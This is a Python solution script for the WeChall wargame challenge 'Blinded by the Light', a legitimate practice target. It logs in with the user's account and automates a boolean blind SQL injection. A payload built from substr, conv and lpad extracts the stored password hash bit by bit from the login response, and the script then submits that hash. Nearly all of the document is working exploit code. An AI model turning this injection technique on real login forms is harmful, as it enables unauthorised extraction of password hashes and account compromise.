#
# [Wecall.net] Blinded by the Light
# Solution by MakMan
# http://mukarramkhalid.com/solution-blinded-by-the-light/
# Requirements : Python 3.4.x or Higher, Requests Module
#
import re, os, sys, getpass
try:
  import requests
except:
  exit('[-] Importing Requests module failed')

class weChall:
  '''http://www.wechall.net'''

  loginUrl  = 'http://www.wechall.net/login'
  challUrl  = 'http://www.wechall.net/challenge/blind_light/index.php'

  def __init__(self, username, password):
    self.login(username, password)

  def login(self, username, password):
    s = requests.Session()
    r = s.get(self.loginUrl)
    r = s.post(self.loginUrl, data = {'username' : username, 'password' : password, 'login' : 'Login'})
    if 'Welcome back to WeChall' in r.text:
      print('[+] Login Successful')
      print('[+] Resetting attempt counter')
      r = s.get(self.challUrl + '?reset=me')
      c = r.request.headers['Cookie']
      self.Cookie = c
    else:
      exit('[-] Login Failed')

class solveChall(weChall):
  '''Extending weChall login class'''

  trueStr   = 'Welcome back, user.'
  falseStr  = 'Your password is wrong, user.'

  def inject(self):
    mySol = ''
    print('[+] Solving [Wechall.net] Blinded by the Light')
    for x in range(1, 33):
      for y in range(1, 5):
        payload = '\' or substr(lpad(conv(substr(password,' + str(x) + ',1),16,2),4,\'0\'),' + str(y) + ',1)-- -'
        data    = {'injection' : payload, 'inject' : 'Inject'}
        try:
          r     = requests.post(self.challUrl, data = data, headers = {'Cookie' : self.Cookie }, timeout = 30)
        except:
          exit('[-] Please check your internet connection')
        if self.trueStr in r.text:
          attempt = re.search('You would now be logged in after (.+?) attempts', r.text).group(1)
          mySol   = mySol + '1'
        elif self.falseStr in r.text:
          attempt = re.search('This was your (.+?)\. attempt', r.text).group(1)
          mySol   = mySol + '0'
      clear   = os.system('cls' if os.name == 'nt' else 'clear')
      print('[+] Attempts : ' + attempt)
      print('[+] Solution : ' + hex(int(mySol,2))[2:])
      print('\nPlease Wait .. ')
      sys.stdout.flush()
    print('[+] Done')
    return hex(int(mySol,2))[2:]

  def submitSolution(self, myHash):
    r = requests.post(self.challUrl, data = {'thehash' : myHash, 'mybutton' : 'Enter'}, headers = {'Cookie' : self.Cookie }, timeout = 30)
    if 'Your answer is correct' in r.text:
      print('[+] Challenge completed successfully.')
    else:
      print('[-] Something went wrong. Please try again.')

def main():
  u = input('Enter WeChall Username: ')
  p = getpass.getpass('Enter WeChall Password: ')
  a = solveChall(u, p)
  solution = a.inject()
  a.submitSolution(solution)

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    exit('[-] CTRL-C detected.')

# End
